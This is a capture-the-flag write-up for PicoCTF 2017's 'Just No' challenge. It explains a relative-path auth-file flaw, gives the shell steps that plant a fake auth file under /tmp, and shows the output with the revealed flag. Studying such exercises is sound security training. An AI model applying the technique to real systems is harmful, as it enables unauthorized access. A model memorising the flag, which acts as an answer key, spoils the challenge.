# PicoCTF 2017 - Level 1 - Just No

**Category:** Binary Exploitation **Points:** 40

**Description:**

> A program at /problems/ab718be873f8a7efe966f4ed5af749eb has access to a flag but 
> refuses to share it. Can you convince it otherwise?

Alright so we have a file called justno and it's accompanying code in C. Looking at the
C code we see a couple of important lines

```
FILE* authf = fopen("../../problems/ab718be873f8a7efe966f4ed5af749
eb/auth","r");

flagf = fopen("/problems/ab718be873f8a7efe966f4ed5af749eb/flag",
"r");
```

No matter where this program is run, the second call to open the flag will run at the
absolute path provided, whereas the read of the auth file will execute on the path
relative to the users current location. So we need to create a new auth file in a
path that follows the conventions above.

```
$ mkdir /tmp/abcde/
$ mkdir /tmp/abcde/problems/
$ mkdir /tmp/abcde/problems/ab718be873f8a7efe966f4ed5af749eb
$ cd /tmp/abcde/problems/ab718be873f8a7efe966f4ed5af749eb
$ echo "yes" > auth
$ /problems/ab718be873f8a7efe966f4ed5af749eb/justno            
Oh. Well the auth file doesn't say no anymore so... Here's the flag:
 3a7cbd7c24f7d5369308333b045382e7
```

The trick here is that the relative path doesn't relate to where the program is, but where
the user is when they execute the program. Were this an absolute path, 
this exploit would not be possible.

